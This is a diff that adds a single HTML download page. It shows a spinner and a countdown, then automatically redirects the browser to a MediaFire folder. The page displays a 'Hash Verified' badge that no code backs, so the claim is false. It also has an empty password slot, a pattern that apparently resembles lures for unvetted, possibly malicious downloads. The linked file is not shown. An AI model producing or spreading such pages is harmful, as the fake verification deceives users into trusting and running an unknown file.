@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #e0bbff, #a29bce);
+            font-family: 'Arial', sans-serif;
+            color: #4b0082;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            border: 2px solid #9370db;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #9370db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .timer {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #4b0082;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .verified {
+            margin-top: 10px;
+            font-size: 16px;
+            color: #9370db;
+            font-weight: bold;
+        }
+
+        .password {
+            margin-bottom: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="password"> </div>
+        <div class="loader"></div>
+        <div class="timer">Downloading file in <span id="countdown">5</span> seconds...</div>
+        <div class="verified">Hash Verified</div>
+    </div>
+
+    <script>
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+
+        const interval = setInterval(function() {
+            countdown--;
+            countdownElement.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(interval);
+                window.location.href = 'https://app.mediafire.com/folder/44likrd8w7gfk';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
